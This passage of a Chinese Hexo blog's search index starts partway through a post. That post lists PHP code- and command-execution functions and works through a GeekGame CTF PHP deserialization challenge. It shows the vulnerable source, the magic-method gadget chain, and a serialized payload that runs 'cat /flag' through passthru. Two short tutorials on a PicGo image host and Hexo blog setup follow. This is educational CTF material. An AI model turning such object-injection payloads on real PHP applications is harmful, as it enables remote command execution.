以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。</p></blockquote></li><li><p>assert()函数：也是将字符串当作php代码执行，不需要以分号结尾，但在php7.1版本后就默认不再可以执行代码了</p></li></ul><p><strong>命令执行相关函数</strong></p><ul><li>system()函数：将字符串作为OS命令执行，自带输出功能。</li><li>passthru()函数：将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。</li><li>exec()函数：将字符串作为OS命令执行，需要输出执行结果，比如使用echo将他打印出来，且它只会输出最后一行的内容。</li><li>shell_exec()：将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。</li><li>反引号&#96;&#96;：里面的代码也会当作OS命令执行，需要输出执行结果。</li><li>popen()&#x2F;proc_open()函数：该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。</li></ul><p><code>以GeekGame的一题为例来进行学习：</code></p><h1><span id="unsign">unsign</span></h1><p>题目的源码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以分析知道有三个魔术方法，分别是：**__destruct()<strong>,</strong>__invoke()<strong>,</strong>__get()**。</p><p>最终我们是要进入$eva1 里面进行命令执行，所以先给eva1和interesting变量进行赋值，注意不能赋值eval，因为eval不能动态调用，然后这是要进入到**__get()<strong>方法中才能进行命令执行，再网上看能看到lover类里面返回了变量，即我们可以通过这里访问web的实例对象不存在的属性从而触发</strong>__get()<strong>方法，看到最后访问的是QW变量，那只要设置一个web对象中不存在的属性即可；要访问该属性，我们又要触发</strong>__invoke()<strong>方法，看到有syc的</strong>__destruct()**方法返回了一个变量当作函数，那我们给这个变量传入lover对象即可；</p><p>所以调用链为这样：**__destruct()<strong>&#x3D;&gt;</strong>__invoke()<strong>&#x3D;&gt;</strong>__get()**</p><p>payload如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>=<span class="hljs-string">&#x27;passthru&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">syc</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lover</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit-&gt;yxx=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">web</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:8:&quot;passthru&quot;;s:11:&quot;interesting&quot;;s:9:&quot;cat /flag&quot;;&#125;s:2:&quot;QW&quot;;s:4:&quot;test&quot;;&#125;&#125;O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:8:&quot;passthru&quot;;s:11:&quot;interesting&quot;;s:9:&quot;cat /flag&quot;;&#125;s:2:&quot;QW&quot;;s:4:&quot;test&quot;;&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置GitHub图床</title>
      <link href="/2023/11/03/%E9%85%8D%E7%BD%AEGitHub%E5%9B%BE%E5%BA%8A/"/>
      <url>/2023/11/03/%E9%85%8D%E7%BD%AEGitHub%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<h1><span id="采用picgo来配置github图床">采用PicGo来配置GitHub图床</span></h1><p>转到picgo的GitHub图床设置来看配置信息：</p><ol><li>我们新建一个仓库来存放图片，比如我开了一个image的仓库，那格式就为&lt;github用户名&gt;&#x2F;image</li><li>分支名以前默认是master，现在是main，如果不创建其他分支填main就好</li></ol><p><img src="http://cdn.clown2024.cn/202407151712977.jpg" alt="picgo2"></p><ol start="3"><li>token是最重要的一步，用来识别你的身份，创建token的时候一定要勾选repo选项不然会上传失败，报各种权限不足。。。</li></ol><p><img src="http://cdn.clown2024.cn/202407151712978.jpg" alt="picgo1"></p><ol start="4"><li>最后在图床上面上传一张图片看是否能成功</li></ol><p>如果要和typora一起用直接在偏好设置中设置使用picgo上传即可。</p><p><img src="http://cdn.clown2024.cn/202407151712979.png" alt="image-20231103224740889"></p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo blog 搭建</title>
      <link href="/2023/11/03/hexo-%E6%90%AD%E5%BB%BAblog/"/>
      <url>/2023/11/03/hexo-%E6%90%AD%E5%BB%BAblog/</url>
      
        <content type="html"><![CDATA[<p>这篇文章记录一下blog的搭建</p><h1><span id="准备工作">准备工作</span></h1><ol><li>github账号</li><li>安装git</li><li>安装nodejs</li></ol><p>这些安装找个教程即可</p><h2><span id="npm修改全局包位置">npm修改全局包位置</span></h2><p>这里是为了不占用c盘的空间，npm安装的包默认在c盘</p><p>这里了解了几个命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm root -g           // 查看全局包的安装目录<br>npm list -g --depth 0 // 查看全局安装过的包<br></code></pre></td></tr></table></figure><blockquote><p>npm list命令可能会报错，这时候更新一下npm就可以了</p><p>npm update -g –verbose</p></blockquote><p>npm安装分为两类：全局包和项目包</p><p>全局安装: 包被安装到了系统目录（一般在系统盘的node_modules中）。</p><ul><li>命令：<code>npm install -g 包名</code> 或者 <code>npm install 包名 -g</code></li></ul><p>项目安装（或者叫本地安装)，包安装在当前项目的根目录下（与package.json同级）的node_modules中。</p><ul><li>命令：<code>npm install 包名</code></li></ul><p>步骤：</p><ol><li><p>在要安装依赖的目录下新建两个文件夹</p><p><img src="http://cdn.clown2024.cn/202407151510139.png"></p><ol start="2"><li><p>在cmd中执行下面两条指令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm config set prefix&quot;nodeglobal路径&quot;<br>npm config set cache &quot;node_cache路径&quot;<br></code></pre></td></tr></table></figure><p>这两条命令修改了存放路径，但是还要修改环境变量系统才知道</p></li><li><p>系统变量添加NODE_PATH，路径为node_global下的node_modules；用户变量的路径中添加node_global的路径即可<img src="http://cdn.clown2024.cn/202407151440886.png" alt="8"></p><p><img src="http://cdn.clown2024.cn/202407151510140.png" alt="2"></p></li><li><p>用npm root -g 命令查看一下是否成功了<img src="http://cdn.clown2024.cn/202407151510141.png"></p></li></ol></li></ol><h1><span id="创建仓库">创建仓库</span></h1><p>这里搜搜教程就好了。</p><h1><span id="安装hexo">安装hexo</span></h1><p>去hexo的官网会有安装命令，如下按顺序执行：</p><blockquote><p>在此之前先新建文件夹在我们要的博客目录下，在该目录打开git bash<img src="http://cdn.clown2024.cn/202407151510142.png"></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm install hexo-cli -g<br>hexo init blog<br>cd blog<br>npm install<br>hexo server //也可以缩写成hexo s<br></code></pre></td></tr></table></figure><blockquote><p>所有操作在git控制台操作就好，不需要Windows的控制台，因为会装到上面这是全局包那里的目录</p></blockquote><p>输入第五行命令之后就可以看到博客地址：</p><p><img src="http://cdn.clown2024.cn/202407151510143.png"></p><p>进行网页之后会给我们一些命令提示：</p><p><img src="http://cdn.clown2024.cn/202407151510144.png"></p><h1><span id="日常操作使用">日常操作使用</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hexo new &lt;文章标题&gt;<br></code></pre></td></tr></table></figure><p>创建一篇新文章，可以在source&#x2F;_posts文件夹中看到文章的文件，是md文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hexo generate//也可以写成 hexo g<br></code></pre></td></tr></table></figure><p>用于生成静态网页，在更改博客后可以使用该命令，但刷新一下网页其实也可以</p><h1><span id="修改主题">修改主题</span></h1><p>我们可以去hexo官网点击下面的探索主题找自己想要的主题;选好之后就会跳到主题的github网页，里面有详细说明可以自己看</p><h1><span id="发布到github-pages">发布到github pages</span></h1><p>安装hexo-deployer-git</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>然后我们需要去修改_config.yml下的文件的deploy选项：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">deploy:<br>  type: git<br>  repo: https://github.com/clowsman/clowsman.github.io.git<br>  branch: main<br>  token: <br></code></pre></td></tr></table></figure><blockquote><p>注意冒号后一定要空格</p></blockquote><p>但是上面使用token的方式我的会报错，可能是repo地址的问题，所以改成ssh的方式来试一试，ssh就可以不要token了</p><p><img src="http://cdn.clown2024.cn/202407151510145.png"></p><p>复制该ssh地址即可</p><blockquote><p>使用之前记得将git绑定ssh</p></blockquote><h1><span id="文章头部的一些关键字">文章头部的一些关键字</span></h1><table><thead><tr><th align="left">参数</th><th align="left">描述</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left"><code>layout</code></td><td align="left">布局</td><td align="left"><a href="https://hexo.io/zh-cn/docs/configuration#%E6%96%87%E7%AB%A0"><code>config.default_layout</code></a></td></tr><tr><td align="left"><code>title</code></td><td align="left">标题</td><td align="left">文章的文件名</td></tr><tr><td align="left"><code>date</code></td><td align="left">建立日期</td><td align="left">文件建立日期</td></tr><tr><td align="left"><code>updated</code></td><td align="left">更新日期</td><td align="left">文件更新日期</td></tr><tr><td align="left"><code>comments</code></td><td align="left">开启文章的评论功能</td><td align="left"><code>true</code></td></tr><tr><td align="left"><code>tags</code></td><td align="left">标签（不适用于分页）</td><td align="left"></td></tr><tr><td align="left"><code>categories</code></td><td align="left">分类（不适用于分页）</td><td align="left"></td></tr><tr><td align="left"><code>permalink</code></td><td align="left">覆盖文章的永久链接，永久链接应该以 <code>/</code> 或 <code>.html</code> 结尾</td><td align="left"><code>null</code></td></tr><tr><td align="left"><code>excerpt</code></td><td align="left">纯文本的页面摘要。使用 <a href="https://hexo.io/zh-cn/docs/tag-plugins#%E6%96%87%E7%AB%A0%E6%91%98%E8%A6%81%E5%92%8C%E6%88%AA%E6%96%AD">该插件</a> 来格式化文本</td><td align="left"></td></tr><tr><td align="left"><code>disableNunjucks</code></td><td align="left">启用时禁用 Nunjucks 标签 <code>&#123;&#123; &#125;&#125;</code>&#x2F;<code>&#123;% %&#125;</code> 和 <a href="https://hexo.io/zh-cn/docs/tag-plugins">标签插件</a> 的渲染功能</td><td align="left">false</td></tr><tr><td align="left"><code>lang</code></td><td align="left">设置语言以覆盖 <a href="https://hexo.io/zh-cn/docs/internationalization#%E8%B7%AF%E5%BE%84">自动检测</a></td><td align="left">继承自 <code>_config.yml</code></td></tr><tr><td align="left"><code>published</code></td><td align="left">文章是否发布</td><td align="left">对于 <code>_posts</code> 下的文章为 <code>true</code>，对于 <code>_draft</code> 下的文章为 <code>false</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>